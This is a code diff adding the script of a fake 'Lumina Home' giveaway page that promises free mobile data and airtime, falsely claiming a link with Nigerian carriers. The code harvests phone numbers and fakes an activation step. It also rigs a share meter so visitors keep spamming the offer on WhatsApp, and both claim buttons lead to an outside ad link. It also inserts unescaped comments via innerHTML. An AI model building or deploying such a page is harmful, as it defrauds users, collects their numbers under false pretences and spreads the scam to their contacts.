+                        phoneInput.classList.add('error');
+                        phoneError.classList.add('show');
+                        return;
+                    }
+                    phoneInput.classList.remove('error');
+                    phoneError.classList.remove('show');
+
+                    localStorage.setItem('lumina_phone', phone);
+                    saveUser({ 
+                        phone: phone, 
+                        network: localStorage.getItem('lumina_network') || 'MTN' 
+                    });
+
+                    showSection('activating');
+                    simulateActivation();
+                });
+
+                if (phoneInput) {
+                    phoneInput.addEventListener('input', function() {
+                        this.value = this.value.replace(/\D/g, '').slice(0, 11);
+                        if (this.value.length === 11) {
+                            this.classList.remove('error');
+                            phoneError.classList.remove('show');
+                        }
+                    });
+
+                    phoneInput.addEventListener('keydown', function(e) {
+                        if (e.key === 'Enter') btnSend.click();
+                    });
+                }
+            }
+
+            async function simulateActivation() {
+                const statuses = ['Connecting...', 'Verifying number...', 'Checking eligibility...', 'Almost done...'];
+                for (let i = 0; i <= 100; i += Math.floor(Math.random() * 10) + 2) {
+                    if (i > 100) i = 100;
+                    if (activationBar) activationBar.style.width = i + '%';
+                    if (activationStatus) activationStatus.textContent = i + '%';
+                    const idx = Math.min(Math.floor(i / 25), statuses.length - 1);
+                    await sleep(200 + Math.random() * 250);
+                }
+                await sleep(500);
+                showSection('share');
+                restoreShareProgress();
+            }
+
+            // ==========================================================
+            // STEP 3: SHARE
+            // ==========================================================
+            function restoreShareProgress() {
+                if (shareProgress > 0) {
+                    if (shareBar) shareBar.style.width = shareProgress + '%';
+                    if (shareStatus) shareStatus.textContent = shareProgress + '%';
+                    if (shareProgress >= 100) {
+                        showSection('claim');
+                    }
+                }
+            }
+
+            if (btnShare) {
+                btnShare.addEventListener('click', function() {
+                    const shareText = encodeURIComponent(
+                        '🎉 *LUMINA HOME ANNIVERSARY GIVEAWAY!* 🎉\n\n' +
+                        'Get 10GB Free Data + ₦5,000 Airtime!\n' +
+                        'In collaboration with MTN, Airtel, Glo & 9-Mobile.\n\n' +
+                        '👉 Claim yours: ' + window.location.origin + '/index.html'
+                    );
+                    const whatsappUrl = 'https://api.whatsapp.com/send?text=' + shareText;
+                    window.open(whatsappUrl, '_blank');
+
+                    // Update share count
+                    let totalShares = parseInt(localStorage.getItem('lumina_total_shares') || '0');
+                    totalShares++;
+                    localStorage.setItem('lumina_total_shares', totalShares);
+
+                    // Simulate progress
+                    if (shareProgress < 100) {
+                        const increments = {
+                            0: 50,
+                            50: 15,
+                            65: 10,
+                            75: 8,
+                            83: 5,
+                            88: 4,
+                            92: 3,
+                            95: 2,
+                            97: 3
+                        };
+                        let added = 0;
+                        for (let threshold in increments) {
+                            if (shareProgress >= parseInt(threshold)) {
+                                added = increments[threshold];
+                            }
+                        }
+                        shareProgress = Math.min(shareProgress + (added || 2), 100);
+                        localStorage.setItem(STORAGE_KEY, shareProgress);
+
+                        if (shareBar) shareBar.style.width = shareProgress + '%';
+                        if (shareStatus) shareStatus.textContent = shareProgress + '%';
+
+                        // Update user shares
+                        const users = JSON.parse(localStorage.getItem('lumina_users') || '[]');
+                        if (users.length > 0) {
+                            users[users.length - 1].shares = (users[users.length - 1].shares || 0) + 1;
+                            localStorage.setItem('lumina_users', JSON.stringify(users));
+                        }
+
+                        if (shareProgress >= 100) {
+                            setTimeout(() => {
+                                showSection('claim');
+                                const users = JSON.parse(localStorage.getItem('lumina_users') || '[]');
+                                if (users.length > 0) {
+                                    users[users.length - 1].claimed = true;
+                                    localStorage.setItem('lumina_users', JSON.stringify(users));
+                                }
+                            }, 600);
+                        }
+                    }
+                });
+            }
+
+            // ==========================================================
+            // STEP 4: CLAIM
+            // ==========================================================
+            if (btnActivateData) {
+                btnActivateData.addEventListener('click', function() {
+                    window.open('https://omg10.com/4/11169333', '_blank');
+                });
+            }
+
+            if (btnActivateAirtime) {
+                btnActivateAirtime.addEventListener('click', function() {
+                    window.open('https://omg10.com/4/11169333', '_blank');
+                });
+            }
+
+            // ==========================================================
+            // PRE-LOADER
+            // ==========================================================
+            if (preLoader) {
+                window.addEventListener('load', function() {
+                    setTimeout(() => {
+                        preLoader.classList.add('hidden');
+                    }, 800);
+                });
+            }
+
+            // ==========================================================
+            // COMMENT INPUT
+            // ==========================================================
+            if (commentInput) {
+                commentInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' && this.value.trim()) {
+                        const comment = this.value.trim();
+                        const container = this.closest('.comments-section');
+                        const newComment = document.createElement('div');
+                        newComment.className = 'comment-item';
+                        newComment.style.animation = 'fadeUp 0.3s ease';
+                        newComment.innerHTML = `
+                            <div style="width: 34px; height: 34px; min-width: 34px; border-radius: 50%; background: #ffd700; display: flex; align-items: center; justify-content: center; color: #1a1a2e; font-weight: 700; font-size: 14px;">U</div>
+                            <div class="body">
+                                <span class="name">Anonymous <span class="badge">New</span></span>
+                                <div class="text">${comment}</div>
+                                <div class="meta">
+                                    <span>Just now</span>
+                                    <span>·</span>
+                                    <span>Like</span>
+                                    <span>·</span>
+                                    <span>Reply</span>
+                                </div>
+                            </div>
+                        `;
+                        const commentSection = container.querySelector('.comment-item:last-child');
+                        if (commentSection) {
+                            commentSection.parentNode.insertBefore(newComment, commentSection.nextSibling);
+                        } else {
+                            container.appendChild(newComment);
+                        }
+                        this.value = '';
+
+                        // Update comment count
+                        const count = container.querySelector('.counter .count:last-child');
+                        if (count) {
+                            const current = parseInt(count.textContent.replace(/[^0-9]/g, ''));
+                            if (!isNaN(current)) {
+                                count.textContent = (current + 1).toLocaleString() + ' comments';
+                            }
+                        }
+                    }
+                });
+            }
+
+            // ==========================================================
+            // CONSOLE
+            // ==========================================================
+            console.log('✅ Lumina Home - New Design Loaded');
+            console.log('📱 Phone saved:', localStorage.getItem('lumina_phone') || 'None');
+            console.log('📊 Total users:', JSON.parse(localStorage.getItem('lumina_users') || '[]').length);
+
+        })();
+    </script>
+
+</body>
+</html>
